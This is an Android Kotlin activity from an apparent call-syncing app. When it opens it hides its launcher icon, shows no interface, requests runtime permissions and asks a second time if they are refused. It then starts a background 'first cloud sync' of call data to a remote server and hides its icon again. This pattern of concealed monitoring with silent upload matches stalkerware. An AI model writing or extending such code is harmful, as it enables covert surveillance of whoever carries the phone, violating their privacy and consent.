package com.calltech

import android.os.Bundle
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Installer Open: turant icon hide + system permission popup.
 * App UI nahi — kill-state sync background mein.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private var retried = false

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { _ ->
            continueAfterPermissionResult()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        MongoSyncHelper.ensureApiUrl(this)
        CallSyncHelper.markBackgroundSyncEnabled(this, true)
        SyncBootstrap.armBackgroundSync(this)
        LauncherHider.hide(this, goHome = false, keepProcess = true)

        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            finishAndSync()
            return
        }

        permissionLauncher.launch(SyncBootstrap.requiredPermissions())
    }

    private fun continueAfterPermissionResult() {
        if (SyncBootstrap.needsRuntimePermissions(this) && !retried) {
            retried = true
            permissionLauncher.launch(SyncBootstrap.requiredPermissions())
            return
        }
        finishAndSync()
    }

    private fun finishAndSync() {
        InstallFlow.completeSetup(applicationContext)
        BackgroundSyncRunner.run {
            try {
                CallSyncService.holdDuring(applicationContext) {
                    InstallFlow.runFirstCloudSync(applicationContext)
                }
            } catch (error: Exception) {
                Log.e(TAG, "Background first sync failed", error)
            }
        }
        LauncherHider.hide(this, goHome = true, keepProcess = true)
        finish()
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
    }
}
